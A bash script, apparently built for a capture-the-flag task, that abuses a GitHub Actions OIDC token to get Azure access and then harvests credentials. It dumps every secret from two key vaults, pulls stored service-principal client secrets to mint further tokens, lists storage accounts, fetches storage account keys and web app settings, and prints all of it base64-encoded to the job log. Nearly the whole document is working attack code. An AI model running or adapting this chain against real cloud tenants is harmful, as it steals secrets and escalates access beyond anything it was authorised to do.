#!/usr/bin/env bash
set -u
B(){ base64 -w0; }
EVT(){ echo "EVT|$1|$2"; }

TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
BOOT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="$AZURE_SUBSCRIPTION_ID"
RG="rg-tbl-platform-prod-sea"

echo "===PROBE_START==="
EVT "ENV" "$(env | grep -iE 'AZURE|SUBSCRIPTION|TENANT|CLIENT|GITHUB_' | B)"

JWT=$(curl -sS -m 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
EVT "JWT_LEN" "$(printf '%s' "$JWT" | wc -c | B)"

mint(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$2" -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$3" | jq -r '.access_token // empty'; }
sectok(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" --data-urlencode "client_secret=$2" -d "scope=$3" -d grant_type=client_credentials \
  | jq -r '.access_token // empty'; }

# Token sets for boot app
VBOOT=$(mint "$BOOT" "https://vault.azure.net/.default" "$JWT")
MBOOT=$(mint "$BOOT" "https://management.azure.com/.default" "$JWT")
EVT "BOOT_VAULT_LEN" "$(printf '%s' "$VBOOT" | wc -c | B)"
EVT "BOOT_MGMT_LEN" "$(printf '%s' "$MBOOT" | wc -c | B)"

# Orientation: resources in subscription
EVT "RESOURCES" "$(curl -sS -m 30 -H "Authorization: Bearer $MBOOT" "https://management.azure.com/subscriptions/$SUB/resources?\$top=500&api-version=2021-04-01" | B)"

VAULTS="kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz"

declare -A VDONE
dumpvault(){ # name token
  [ -n "${VDONE[$1]:-}" ] && return 0
  L=$(curl -sS -m 25 -H "Authorization: Bearer $2" "https://$1.vault.azure.net/secrets?api-version=7.4&maxresults=25")
  echo "$L" | jq -e '.value' >/dev/null 2>&1 || return 1
  VDONE[$1]=1
  EVT "KVLIST|$1" "$(printf '%s' "$L" | B)"
  NEX=$(printf '%s' "$L" | jq -r '.nextLink // empty')
  for N in $(printf '%s' "$L" | jq -r '.value[].id' | sed 's#.*/secrets/##'); do
    V=$(curl -sS -m 25 -H "Authorization: Bearer $2" "https://$1.vault.azure.net/secrets/$N?api-version=7.4")
    EVT "KVSEC|$1/$N" "$(printf '%s' "$V" | B)"
  done
  # follow nextLink if present
  i=0
  while [ -n "$NEX" ] && [ $i -lt 6 ]; do
    L=$(curl -sS -m 25 -H "Authorization: Bearer $2" "$NEX")
    EVT "KVLIST|$1|p$i" "$(printf '%s' "$L" | B)"
    for N in $(printf '%s' "$L" | jq -r '.value[].id' | sed 's#.*/secrets/##'); do
      V=$(curl -sS -m 25 -H "Authorization: Bearer $2" "https://$1.vault.azure.net/secrets/$N?api-version=7.4")
      EVT "KVSEC|$1/$N" "$(printf '%s' "$V" | B)"
    done
    NEX=$(printf '%s' "$L" | jq -r '.nextLink // empty'); i=$((i+1))
  done
  return 0
}

# Boot can try both vaults
for KV in $VAULTS; do dumpvault "$KV" "$VBOOT"; done

# Expand principals from prod vault
SAS="cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal"
for S in $SAS; do
  RAW=$(curl -sS -m 25 -H "Authorization: Bearer $VBOOT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$S?api-version=7.4")
  EVT "PRINCIPAL_RAW|$S" "$(printf '%s' "$RAW" | B)"
  AID=$(printf '%s' "$RAW" | jq -r '.value' 2>/dev/null | jq -r '.appId // empty')
  CS=$(printf '%s' "$RAW" | jq -r '.value' 2>/dev/null | jq -r '.clientSecret // empty')
  [ -z "$AID" ] || [ -z "$CS" ] && continue
  echo "### principal $AID"
  for SC in "https://vault.azure.net/.default" "https://storage.azure.com/.default" "https://management.azure.com/.default"; do
    T=$(sectok "$AID" "$CS" "$SC")
    [ -z "$T" ] && { EVT "NOTOK|$AID|$SC" ""; continue; }
    case "$SC" in
      *vault*) for KV in $VAULTS; do dumpvault "$KV" "$T"; done ;;
      *storage*)
        EVT "STO_LSTOK|$AID" "$(printf '%s' "$T" | cut -c1-30 | B)"
        for AC in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
          R=$(curl -sS -m 25 -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "https://$AC.blob.core.windows.net/?restype=service&comp=resources&prefixes=on&include=Snapshots")
          EVT "STOLIST|$AC" "$(printf '%s' "$R" | B)"
        done
        ;;
      *management*)
        for SA in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
          R=$(curl -sS -m 25 -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
          EVT "LISTKEYS|$SA|$AID" "$(printf '%s' "$R" | B)"
        done
        for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
          R=$(curl -sS -m 25 -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-09-01")
          EVT "APPSET|$SITE|$AID" "$(printf '%s' "$R" | B)"
        done
        ;;
    esac
  done
done

# Search for the flag across anything we can quickly read from mgmt token: keyvaults list
EVT "KV_ALL" "$(curl -sS -m 30 -H "Authorization: Bearer $MBOOT" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2021-11-01-preview" | B)"
echo "=====PROBE_DONE====="
